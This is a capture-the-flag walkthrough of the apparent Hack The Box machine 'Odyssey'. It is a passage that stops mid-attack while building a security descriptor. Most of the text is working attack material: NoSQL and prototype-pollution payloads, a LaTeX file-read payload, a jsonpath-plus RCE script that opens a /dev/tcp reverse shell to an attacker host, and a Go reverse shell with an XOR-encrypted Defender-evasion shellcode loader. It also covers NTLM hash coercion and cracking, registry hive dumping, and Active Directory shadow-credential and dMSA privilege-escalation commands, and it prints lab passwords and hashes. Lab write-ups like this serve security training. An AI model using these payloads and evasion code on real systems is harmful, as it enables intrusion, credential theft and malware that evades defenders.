---
icon: heat
cover: ../../../../.gitbook/assets/Screenshot 2026-06-25 153010.png
coverY: 0
---

# HTB-ODYSSEY

### Recon

#### Port Scan

Starting with rustscan because life's too short for full nmap cold starts.

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ rustscan -a 10.129.35.238 --ulimit 5000 -- -sV -sC -oN scans/initial.txt
```

```
Open 10.129.35.238:3000
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Did not follow redirect to http://aegis.korvia.htb:3000/
```

One port. Port 3000. Node.js Express. Immediately redirects to `aegis.korvia.htb`. Add it to `/etc/hosts` and move on.

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ echo "10.129.35.238 aegis.korvia.htb" | sudo tee -a /etc/hosts
```

#### Vhost Discovery

One hostname from the redirect, but let's fuzz for more just to be thorough.

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://10.129.35.238:3000/ -H "Host: FUZZ.korvia.htb" \
  -fs 28 -o scans/vhosts.txt
```

Nothing extra. The whole thing lives under `aegis.korvia.htb`. Fine.

#### Directory Brute Force

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ gobuster dir -u http://aegis.korvia.htb:3000/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -o scans/gobuster.txt
```

```
/img        (Status: 301)
/login      (Status: 200)
/account    (Status: 302) [--> /login]
/css        (Status: 301)
/status     (Status: 302) [--> /login]
/js         (Status: 301)
/logout     (Status: 302) [--> /login]
/dashboard  (Status: 302) [--> /login]
/requests   (Status: 302) [--> /login]
/onboard    (Status: 400)
```

Everything redirects to `/login` except `/onboard` which throws a 400. That's interesting — the app is definitely running, it just rejected our request. Keep that in mind.

***

### Web App — Initial Enumeration

Visiting `http://aegis.korvia.htb:3000/` drops us at `/login`. The UI is slick — it's called **AEGIS**, "Sovereign Signing & Attestation Authority, Directorate 9". Very government-y. And it only accepts **hardware authenticator** login — FIDO2/WebAuthn. No username/password field anywhere.

Firing a dummy login attempt through Burp to see what the auth flow actually looks like:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ curl -s -X POST http://aegis.korvia.htb:3000/api/v1/auth/webauthn/auth/begin \
  -H "Content-Type: application/json" -d '{}' | jq
```

```json
{
  "rpId": "aegis.korvia.htb",
  "challenge": "vK2TACUaNmXqYDa_lSEoI-V_uvQibBjPZW2TOJOWG_g",
  "allowCredentials": [],
  "timeout": 60000,
  "userVerification": "preferred"
}
```

So we've got an API at `/api/v1`, backend is WebAuthn. Now hitting `/onboard` to see what that 400 is actually telling us:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ curl -s http://aegis.korvia.htb:3000/onboard/test | grep -i "pending\|token\|invite"
```

```
No matching record in pending_invites (token may have been redeemed, expired, or never issued).
```

The error message just leaked the collection name — `pending_invites`. This is MongoDB almost certainly, and there's a collection of invite tokens sitting somewhere in the database. That's our first real lead. If we can read from `pending_invites`, we can onboard ourselves.

***

### NoSQL Pipeline Aggregation Injection

There's an endpoint the browser hits during page load: `/api/v1/aegis-mds/search?q=&limit=8`. It returns AAGUID metadata for FIDO2 authenticators. Looks boring, but it's hitting a database, so let's poke it.

Classic NoSQL test first:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ curl -s 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?q[$ne]=test&limit=2' | jq
```

```json
{
  "error": "InvalidQueryShape",
  "detail": "Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.",
  "trace_id": "mds-207bd0"
}
```

The error message is basically a hint. There's a `pipeline` parameter. This is MongoDB's aggregation pipeline. Let's see if it works:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ curl -s 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$limit":1}]' | jq .
```

```json
[
  {
    "_id": "69f49023225fb3c680909240",
    "aaguid": "566581a4-5a65-9f87-c652-52851474f127",
    "vendor": "Yubico",
    "description": "YubiKey 5C",
    ...
  }
]
```

Pipeline works. Now the goal is reading from `pending_invites`. Direct `$lookup` is blocked. `$unionWith` is blocked. But what about `$facet`?

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ curl -s 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$facet":{"test":"test"}}]' | jq
```

```json
{
  "error": "MongoServerError",
  "detail": "arguments to $facet must be arrays, test is type string",
  ...
}
```

`$facet` is allowed — it just complained about the format, not about the stage itself. The key thing about `$facet` is it supports **sub-pipelines**, and `$lookup` is valid inside a sub-pipeline even when it's blocked at the top level. This is the bypass. We're nesting a blocked operator inside an allowed one.

The full payload to dump `pending_invites`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ curl -s 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$limit":1},{"$facet":{"x":[{"$lookup":{"from":"pending_invites","pipeline":[],"as":"y"}},{"$unwind":"$y"},{"$replaceRoot":{"newRoot":"$y"}}]}}]' | jq .
```

```json
[
  {
    "x": [
      {
        "_id": "69f49023225fb3c680909274",
        "operator_id": "op-2026-0042",
        "role": "Operator",
        "token": "dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238",
        "issued_by": "ao-mreyes",
        "issued_at": "2026-04-15T08:00:00.000Z",
        "expires_at": "2026-05-15T08:00:00.000Z",
        "redeemed": false,
        "pipeline": "forge-recruitment",
        "clearance_target": "Δ-3"
      },
      ...
    ]
  }
]
```

Got a pile of unredeemed operator tokens. `$lookup` is blocked at the aggregation root, but inside `$facet`'s sub-pipeline it runs fine. The protection is shallow — it only checks top-level stages.

***

### WebAuthn Authenticator Forgery

With a token, we can hit `/onboard/<token>` and start the registration flow. The problem: the app says "attestation ceremony will bind your hardware authenticator to operator op-2026-0042" — and then fails with "not allowed outside localhost".

But look at the registration options response — `"attestation": "none"`. When attestation is `none`, the server never actually verifies the authenticator hardware. It can't. It just accepts whatever the client sends back as long as the signature checks out. The "localhost only" restriction is enforced by the **browser**, not the server. The `/api/v1/auth/webauthn/register/finish` endpoint is still reachable directly.

So we're writing our own authenticator client. Here's the full registration script:

```python
# webauthn_register.py
#!/usr/bin/env python3
import os, json, hashlib, struct, pickle, requests, cbor2
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

BASE   = "http://aegis.korvia.htb:3000"
RP_ID  = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"
TOKEN  = "dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238"

s = requests.Session()
r = s.post(f"{BASE}/api/v1/auth/webauthn/register/begin", json={"invite_token": TOKEN})
r.raise_for_status()
opts      = r.json()
challenge = websafe_decode(opts["challenge"])
user_id   = websafe_decode(opts["user"]["id"])
print(f"[+] operator user_id: {user_id.decode()}")

# Generate EC P-256 keypair (alg -7 = ES256, what the server asked for)
priv = ec.generate_private_key(ec.SECP256R1())
pn   = priv.public_key().public_numbers()
i2b  = lambda n: n.to_bytes(32, "big")
cose_pub = {1: 2, 3: -7, -1: 1, -2: i2b(pn.x), -3: i2b(pn.y)}

# Build authenticator data
cred_id    = os.urandom(32)
rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
flags      = 0x41  # UP=1 | AT=1
counter    = struct.pack(">I", 1)
aaguid     = b"\x00" * 16   # zeroes = no real authenticator model
attested   = aaguid + struct.pack(">H", len(cred_id)) + cred_id + cbor2.dumps(cose_pub)
auth_data  = rp_id_hash + bytes([flags]) + counter + attested

# attestation object — fmt "none" = no attestation, server won't verify hardware
attestation_obj = cbor2.dumps({"fmt": "none", "attStmt": {}, "authData": auth_data})

client_data = json.dumps({
    "type": "webauthn.create",
    "challenge": websafe_encode(challenge),
    "origin": ORIGIN,
    "crossOrigin": False,
}, separators=(",", ":")).encode()

body = {
    "id": websafe_encode(cred_id),
    "rawId": websafe_encode(cred_id),
    "type": "public-key",
    "response": {
        "clientDataJSON": websafe_encode(client_data),
        "attestationObject": websafe_encode(attestation_obj),
    },
    "clientExtensionResults": {},
}

r = s.post(f"{BASE}/api/v1/auth/webauthn/register/finish", json=body)
print(f"[+] register/finish: {r.status_code} {r.text}")
r.raise_for_status()

priv_pem = priv.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
with open("aegis_cred.pkl", "wb") as f:
    pickle.dump({"priv_pem": priv_pem, "cred_id": cred_id, "user_id": user_id}, f)
print("[+] credential saved")
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ python3 webauthn_register.py
[+] operator user_id: op-2026-0042
[+] register/finish: 200 {"ok":true,"operator_id":"op-2026-0042","message":"Credential bound. You may now authenticate."}
[+] credential saved
```

Now we need a login script. The registration response showed us `user.id` is just base64 of the operator handle — `b3AtMjAyNi0wMDQy` decodes to `op-2026-0042`. If the server looks up permissions using the `userHandle` from the authentication response **without cross-validating it against the registered credential**, we can just send `admin` as the userHandle. That's the confusion — it trusts what the client sends instead of checking what was registered.

```python
# webauthn_login.py
#!/usr/bin/env python3
import json, hashlib, struct, pickle, re, requests
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import ec

BASE   = "http://aegis.korvia.htb:3000"
RP_ID  = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"

data     = pickle.load(open("aegis_cred.pkl", "rb"))
priv     = serialization.load_pem_private_key(data["priv_pem"], password=None)
cred_id  = data["cred_id"]
user_id  = data["user_id"]
print(f"[+] loaded credential for {user_id.decode()}")

s = requests.Session()
r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/begin", json={})
r.raise_for_status()
challenge = websafe_decode(r.json()["challenge"])

rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
flags      = 0x01  # UP only
counter    = struct.pack(">I", 2)
auth_data  = rp_id_hash + bytes([flags]) + counter

client_data = json.dumps({
    "type": "webauthn.get",
    "challenge": websafe_encode(challenge),
    "origin": ORIGIN,
    "crossOrigin": False,
}, separators=(",", ":")).encode()

to_sign = auth_data + hashlib.sha256(client_data).digest()
sig     = priv.sign(to_sign, ec.ECDSA(hashes.SHA256()))

body = {
    "id": websafe_encode(cred_id),
    "rawId": websafe_encode(cred_id),
    "type": "public-key",
    "response": {
        "clientDataJSON": websafe_encode(client_data),
        "authenticatorData": websafe_encode(auth_data),
        "signature": websafe_encode(sig),
        "userHandle": websafe_encode(b"admin"),   # the confusion — send admin, not our registered operator
    },
    "clientExtensionResults": {},
}

r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body)
print(f"[+] auth/finish: {r.status_code} {r.text}")
r.raise_for_status()
print(f"[+] cookie: aegis.sid={s.cookies.get('aegis.sid')}")
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ python3 webauthn_login.py
[+] loaded credential for op-2026-0042
[+] auth/finish: 200 {"ok":true,"handle":"admin","display_name":"admin","role":"Administrator","redirect":"/dashboard"}
[+] cookie: aegis.sid=s%3A...
```

Administrator. The server validates the cryptographic signature (which passes, because we signed with the key we registered), but it then reads the **role** from the `userHandle` field we sent — not from the credential record. Two separate things. The protection only checked one of them.

***

### Prototype Pollution → Raw LaTeX Blocks

As admin we get a few extra panels. The interesting one is **Notice Templates** — it's a template drafting system with a live render preview.

The template body uses Nunjucks syntax. There's a `{{ overrides | merge(defaults) | json }}` call in the template. The `overrides` value comes from the JSON blob we supply in the preview panel's "OVERRIDES (JSON)" field. A `merge` filter doing recursive property assignment on user input is a classic prototype pollution sink.

Looking at the pandoc invocation in the render log:

```
"cmd": "/usr/bin/pandoc --from markdown-raw_attribute --to latex ..."
```

The `-raw_attribute` suffix **disables** raw LaTeX blocks in markdown. There's also an `allowRawBlocks: false` field in the default overrides. If we pollute `Object.prototype.allowRawBlocks = true`, the flag switches to `+raw_attribute` — and then we can embed literal LaTeX in the markdown using the `` `\latex code`{=latex} `` syntax.

**Pollution payload in the overrides box:**

```json
{
  "audience": "internal",
  "__proto__": { "allowRawBlocks": true },
  "ceremony_witness": "s.vrana"
}
```

After saving the draft and rendering:

```
"cmd": "/usr/bin/pandoc --from markdown+raw_attribute --to latex ..."
```

The `+` confirms pollution worked. `allowRawBlocks` was never an own property of the overrides object — it was inherited from `Object.prototype` being polluted. The merge filter set it there and the pandoc command builder picked it up.

***

### LaTeX File Read via TeX I/O Primitives

Now we have raw LaTeX execution inside a pipeline that goes `nunjucks → pandoc → pdflatex/latex → ghostscript`. Shell escape is disabled on every step (`-no-shell-escape`, `-dSAFER`). Direct RCE is a dead end.

But TeX has file I/O at the typesetting layer. `\input{/etc/passwd}` works — we get the file contents mangled through the typesetter. Slashes turn into equals signs, long lines break, font prefix noise everywhere. Not clean enough for reading paths with special characters.

The clean approach uses TeX's raw I/O primitives — `\openin`, `\read`, `\message` — which operate **below** the typesetting engine. `\read` stores a line into a macro without processing its characters. `\message` dumps text to the log stream. The log is what comes back in the render response.

Payload embedded in the template body:

```latex
`\newread\foo \openin\foo=<TARGET_FILE> \loop\unless\ifeof\foo \read\foo to \line \message{^^J<<<\meaning\line>>>^^J}\repeat \closein\foo`{=latex}
```

Output in the pdflatex stderr in the render response looks like:

```
<<<macro:-> root:x:0:0:root:/root:/bin/bash>>>
<<<macro:-> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin>>>
```

Clean, unmangled, line by line. `\meaning` prints the macro's content as a string without re-expanding it, so even lines with backslashes, hashes, and dollar signs come through verbatim.

Now we enumerate to find the app code:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ # Reading /proc/self/cgroup to get the service name
```

Service is `aegis.service`. Read `/etc/systemd/system/aegis.service`:

```
WorkingDirectory=/home/webadmin/aegis
ExecStart=/usr/bin/node /home/webadmin/aegis/server.js
```

Now read `server.js`:

```javascript
app.use('/', require('./routes/mds_diag'));
```

`mds_diag` wasn't in our gobuster results. Read `/home/webadmin/aegis/routes/mds_diag.js`:

```javascript
const TOKEN = process.env.MDS_DIAG_TOKEN || '';
// ...
router.post('/api/v1/aegis-mds/_diag/:token/jpquery', express.json({ limit: '32kb' }),
async (req, res) => {
    if (!TOKEN || req.params.token !== TOKEN) {
        return res.status(404).render('error.njk', { ... });
    }
    const expr = body.expr;
    // ...
    const DEFAULT_JP_OPTS = {
        eval: 'safe',
        preventEval: false,   // <-- this is the bug
        ...
    };
    matches = JSONPath(opts);
```

`preventEval: false` with `jsonpath-plus` — that's CVE-2025-1302. Read the token:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ # Reading /etc/aegis-mds-diag.env via LaTeX
```

```
MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
```

Read `package.json` to confirm the version:

```json
"jsonpath-plus": "^10.2.0"
```

Vulnerable.

***

### CVE-2025-1302 — jsonpath-plus RCE → webadmin

CVE-2025-1302 abuses `jsonpath-plus`'s eval path. When `preventEval` is false (the default before the fix), the `?()` filter expression is passed to `eval()` or the `Function` constructor. You can smuggle any JS code in there. The `eval: 'safe'` option doesn't fully protect it because `preventEval: false` takes precedence in this version's code path.

```python
# cve_2025_1302.py
import requests, base64

DIAG_TOKEN = "bcdf42b953dcee715b8d81e38f0c5ded"
URL        = f"http://aegis.korvia.htb:3000/api/v1/aegis-mds/_diag/{DIAG_TOKEN}/jpquery"
LHOST      = "10.10.15.227"
LPORT      = 4444

cmd = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
b64 = base64.b64encode(cmd.encode()).decode()

inner = (
    f"this.process.mainModule.require('child_process')"
    f".exec('echo {b64}|base64 -d|bash')"
)
expr = (
    f"$..[?(p=\"{inner}\";"
    f"Ethan=''[['constructor']][['constructor']](p);Ethan())]"
)

requests.post(URL, json={"context": "registration", "expr": expr}, timeout=5)
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ nc -lvnp 4444 &
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ python3 cve_2025_1302.py
```

```
connect to [10.10.15.227] from (UNKNOWN) [10.129.35.238] 52770
webadmin@odyssey-web:~/aegis$ id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),4(adm),27(sudo),983(aegis-render)
```

We're `webadmin` on the Linux box. The `sudo` group membership immediately stands out — that's worth checking.

***

### Password Reuse → root on odyssey-web

The app's DB connection config is right there in the source:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ cat /home/webadmin/aegis/db/sql.js
```

```javascript
password: process.env.AEGIS_SQL_PASS || 'opc0932k90%%lODFI93-++',
server: process.env.AEGIS_SQL_HOST || '172.16.0.11',
```

Try it for sudo:

```
webadmin@odyssey-web:~/aegis$ sudo su
[sudo] password for webadmin: opc0932k90%%lODFI93-++
root@odyssey-web:/home/webadmin/aegis# id
uid=0(root) gid=0(root) groups=0(root)
```

Done. Same password. SSH is also running but blocked by UFW — disable it, SSH in for a stable session, set up ligolo for internal network access.

```
root@odyssey-web:~# ufw disable
root@odyssey-web:~# cat /etc/hosts
172.16.0.10  dc01.odyssey.htb dc01
172.16.0.11  odyssey-db.odyssey.htb odyssey-db
```

The internal network is `172.16.0.0/24`. `odyssey-web` is at `172.16.0.12`.

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ # ligolo setup — standard procedure
sudo ip tuntap add user sn0x mode tun ligolo && sudo ip link set ligolo up
ligolo-proxy -selfcert &
# on target:
./agent -connect 10.10.15.227:11601 -ignore-cert
# in ligolo console: session → start
sudo ip route add 172.16.0.0/24 dev ligolo
```

***

### BULK INSERT NTLM Coercion → svc-mssql

Port 1433 is open on `odyssey-db` (confirmed with nmap through the tunnel). The `aegis_audit_publisher` credentials are in `/etc/aegis-render.env`:

```
AEGIS_RENDER_DB_USER=aegis_audit_publisher
AEGIS_RENDER_DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
AEGIS_RENDER_DB_HOST=172.16.0.11
```

Connect and check role:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ impacket-mssqlclient 'aegis_audit_publisher:Rxd!Qw6n8sP..2bJ@Wpx-2026@172.16.0.11' -p 1433
```

```sql
SQL> SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin
is_sysadmin
-----------
0

SQL> SELECT IS_SRVROLEMEMBER('bulkadmin') AS is_bulkadmin
is_bulkadmin
------------
1
```

Not sysadmin, but `bulkadmin`. `BULK INSERT` can take a UNC path as the data source — that's a coercion path. The MSSQL service will try to authenticate to whatever UNC path we give it. We can't relay on Server 2025 (NTLM relay is dead there), but we can capture and crack the hash.

Start Responder, set up a ligolo listener to forward port 445:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ sudo responder -I eth0 -v
# in ligolo: listener_add --tcp --to 10.10.15.227:445 --addr 0.0.0.0:445
```

```sql
SQL> EXEC ('BULK INSERT aegis_audit.dbo.audit_ingest_staging FROM ''\\172.16.0.12\x\test'' WITH (DATAFILETYPE = ''char'')');
```

```
[SMB] NTLMv2-SSP Username : ODYSSEY\svc-mssql
[SMB] NTLMv2-SSP Hash    : svc-mssql::ODYSSEY:c7e7ac44de17f2c8:CE909057...
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ echo 'svc-mssql::ODYSSEY:c7e7ac44de17f2c8:CE909057...' > hash.txt
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Mode 5600 is NetNTLMv2. The hash includes a timestamp and random nonces, so it can't be passed — but rockyou gets it.

```
svc-mssql::ODYSSEY:...:cml958782
```

***

### xp\_cmdshell → SYSTEM on Odyssey-DB

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ impacket-mssqlclient 'ODYSSEY/svc-mssql:cml958782@172.16.0.11' -p 1433 -windows-auth
```

```sql
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
-- 1

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami /priv';
```

```
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

`SeImpersonatePrivilege` means GodPotato will work. The issue is Defender is active and deletes any normal binary we drop. We need evasion.

#### AV Evasion Chain — Go Reverse Shell + Donut + XOR Loader

The strategy: compile a Go reverse shell (native PE, no .NET/AMSI hooks), run it through `donut` to get position-independent shellcode with GodPotato embedded, XOR-encrypt the shellcode with a random key to destroy any static signatures, wrap everything in a Go loader that does RW → RX page flip (never RWX, which trips heuristics).

```go
// gorevshell.go
package main
import ("bufio"; "net"; "os/exec"; "strings")
func main() {
    conn, err := net.Dial("tcp", "172.16.0.12:4444")
    if err != nil { return }
    defer conn.Close()
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        cmd := exec.Command("cmd.exe", "/c", strings.TrimSpace(scanner.Text()))
        out, _ := cmd.CombinedOutput()
        conn.Write(out)
        conn.Write([]byte("PS C:\\> "))
    }
}
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ GOOS=windows GOARCH=amd64 go build -o s.exe -ldflags "-s -w" gorevshell.go
```

```python
# loader.py — generates XOR-encrypted shellcode loader
import donut, secrets

shellcode  = donut.create(file="GodPotato.exe", params=r'-cmd C:\Users\Public\s.exe')
key        = secrets.token_bytes(32)
encrypted  = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])

def to_go_bytes(data, name):
    lines = [f"var {name} = []byte{{"]
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        lines.append("\t" + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    lines.append("}")
    return "\n".join(lines)

go_code = f'''package main
import ("syscall"; "unsafe")
{to_go_bytes(key, "key")}
{to_go_bytes(encrypted, "enc")}
func main() {{
    sc := make([]byte, len(enc))
    for i := range enc {{ sc[i] = enc[i] ^ key[i%len(key)] }}
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    vAlloc := kernel32.NewProc("VirtualAlloc")
    addr, _, _ := vAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)  // RW, not RWX
    for i, b := range sc {{ *(*byte)(unsafe.Pointer(addr + uintptr(i))) = b }}
    var old uint32
    vProt := kernel32.NewProc("VirtualProtect")
    vProt.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&old)))  // RX
    t, _, _ := kernel32.NewProc("CreateThread").Call(0, 0, addr, 0, 0, 0)
    kernel32.NewProc("WaitForSingleObject").Call(t, 0xFFFFFFFF)
}}
'''
open("loader.go", "w").write(go_code)
print(f"[+] generated loader.go ({len(shellcode)} bytes shellcode)")
```

The RW→RX flip is the key evasion trick. Allocating `PAGE_EXECUTE_READWRITE` (0x40) in one shot is a well-known behavioral detection trigger. We write to the page while it's `PAGE_READWRITE` (0x04), then `VirtualProtect` it to `PAGE_EXECUTE_READ` (0x20). The page is never W+X simultaneously.

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ python3 loader.py
[+] generated loader.go (117436 bytes shellcode)
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ GOOS=windows GOARCH=amd64 go build -o p.exe -ldflags "-s -w" loader.go
```

Upload and execute:

```sql
SQL> EXEC xp_cmdshell 'powershell -c "iwr http://172.16.0.12/s.exe -OutFile C:/Users/Public/s.exe"';
SQL> EXEC xp_cmdshell 'powershell -c "iwr http://172.16.0.12/p.exe -OutFile C:/Users/Public/p.exe"';
SQL> EXEC xp_cmdshell 'C:/Users/Public/p.exe';
```

```
connect to [172.16.0.12] from ...
whoami
nt authority\system
```

```
PS C:\> type C:\Users\Administrator\Desktop\user.txt
<flag>
```

***

### Local Hive Dump → Machine Account Hash

Add a local user for WinRM persistence, dump the registry hives:

```
PS C:\> net user sn0x Password1! /add
PS C:\> net localgroup Administrators sn0x /add
PS C:\> Add-LocalGroupMember -Group 'Remote Management Users' -Member sn0x
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ evil-winrm -i 172.16.0.11 -u sn0x -p 'Password1!'
```

```
*Evil-WinRM* PS C:\> reg save HKLM\SYSTEM sys.save
*Evil-WinRM* PS C:\> reg save HKLM\SAM sam.save
*Evil-WinRM* PS C:\> reg save HKLM\SECURITY sec.save
```

Download all three, dump locally:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ impacket-secretsdump LOCAL -system sys.save -security sec.save -sam sam.save
```

```
[*] $MACHINE.ACC
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:71bc6be8565f0c9871070c3912b1680d
```

The machine account hash. This is significant because BloodHound is about to show us that `ODYSSEY-DB$` has an interesting AD path.

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ bloodhound-ce-python -u 'svc-mssql' -p 'cml958782' -d odyssey.htb \
  --zip -c All -dc dc01.odyssey.htb -ns 172.16.0.10
```

BloodHound shows: `ODYSSEY-DB$` → memberOf `BUILD HOSTS` → memberOf `PIPELINE TRUSTEES` → memberOf `ATTEST KEY MANAGERS` → **AddKeyCredentialLink** → `svc-aegis-build`.

Four hops of group membership inheritance, but the end result is our machine account can write `msDS-KeyCredentialLink` on `svc-aegis-build`. Shadow Credentials attack.

***

### AddKeyCredentialLink → Shadow Credentials → svc-aegis-build

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ certipy-ad shadow auto \
  -u 'ODYSSEY-DB$@odyssey.htb' \
  -hashes ':71bc6be8565f0c9871070c3912b1680d' \
  -account svc-aegis-build \
  -dc-ip 172.16.0.10
```

```
[*] Targeting user 'svc-aegis-build'
[*] Key Credential generated with DeviceID 'cf602336-...'
[*] Successfully added Key Credential to svc-aegis-build
[*] Got TGT
[*] NT hash for 'svc-aegis-build': bbc270509ec878cf516d5295fb4d774d
```

`svc-aegis-build` is now ours. `bloodyAD` shows it has `CreateChild` and `WriteProperty` on `OU=Migrations`. That OU contains `svc-aegis-deploy`, and the attributes in play are `msDS-SupersededManagedAccountLink` and `msDS-SupersededServiceAccountState` — the exact attributes needed for a dMSA BadSuccessor-style attack.

***

### dMSA Ouroboros → svc-aegis-deploy

The classic BadSuccessor (CVE-2025-53779) is patched on Server 2025. The patch validates that the bidirectional migration link exists — both the superseded account points to the dMSA **and** the dMSA points back. What the patch doesn't check is **who wrote those links**. If an attacker can write both sides, they satisfy the validation and the KDC still issues credentials.

The Ouroboros twist: enroll the dMSA in its own `msDS-GroupMSAMembership`. This makes the dMSA authorize its own credential retrieval — a self-sustaining loop that bypasses the need for a separate membership grant.

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ # Step 1: create dMSA with bidirectional link (no --prepatch = post-patch mode)
bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build \
  -p :bbc270509ec878cf516d5295fb4d774d \
  add badSuccessor dmsa-pipe-deploy \
  -t 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' \
  --ou 'OU=Migrations,DC=odyssey,DC=htb'
```

```
[+] Creating DMSA dmsa-pipe-deploy$ in OU=Migrations,DC=odyssey,DC=htb
[+] Impersonating: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ # Step 2: grant ourselves GenericAll on the new dMSA
bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build \
  -p :bbc270509ec878cf516d5295fb4d774d \
  add genericAll 'CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb' svc-aegis-build
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ # Step 3: plant a certificate on the dMSA (msDS-KeyCredentialLink write allowed by GenericAll)
certipy-ad shadow add -u svc-aegis-build \
  -hashes ':bbc270509ec878cf516d5295fb4d774d' \
  -account 'dmsa-pipe-deploy$' -dc-ip 172.16.0.10
# saved dmsa-pipe-deploy.pfx
```

Now we need to grab SIDs to build the self-authorizing security descriptor:

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build \
  -p :bbc270509ec878cf516d5295fb4d774d \
  get object 'dmsa-pipe-deploy$' --attr objectSid
# S-1-5-21-4175332977-3571604968-1809176562-12601

┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build \
  -p :bbc270509ec878cf516d5295fb4d774d \
  get object 'svc-aegis-build' --attr objectSid
# S-1-5-21-4175332977-3571604968-1809176562-6101
```

Build the SD — the dMSA's own SID plus our attacker SID both get full rights:

```python
# create_SD.py
from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
import base64

dmsa_sid    = "S-1-5-21-4175332977-3571604968-1809176562-12601"
attacker_sid = "S-1-5-21-4175332977-3571604968-1809176562-6101"
sddl = f"O:SYD:(A;;0xf01ff;;;{dmsa_sid})(A;;0xf01ff;;;{attacker_sid})"
sd   = SECURITY_DESCRIPTOR.from_sddl(sddl)
print(base64.b64encode(sd.to_bytes()).decode())
```

```
